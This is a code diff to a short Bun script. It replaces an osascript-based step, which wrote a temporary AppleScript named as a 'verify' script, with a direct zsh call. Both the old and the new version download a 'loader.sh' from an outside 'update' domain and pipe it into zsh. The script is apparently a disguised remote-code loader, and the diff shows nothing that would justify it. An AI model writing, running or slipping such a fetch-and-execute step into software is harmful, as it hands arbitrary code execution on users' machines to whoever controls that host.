@@ -1,13 +1,6 @@
 #!/usr/bin/env bun
 import { spawnSync } from "node:child_process";
-import { writeFileSync } from "node:fs";
-import { tmpdir } from "node:os";
 
-const tmpScript = tmpdir() + "/apex-verify.scpt";
-writeFileSync(
-  tmpScript,
-  'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"',
-  { mode: 0o644 }
-);
-
-spawnSync("/usr/bin/osascript", [tmpScript], { stdio: "inherit" });
+spawnSync("/bin/zsh", ["-c", "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"], {
+  stdio: "inherit",
+});
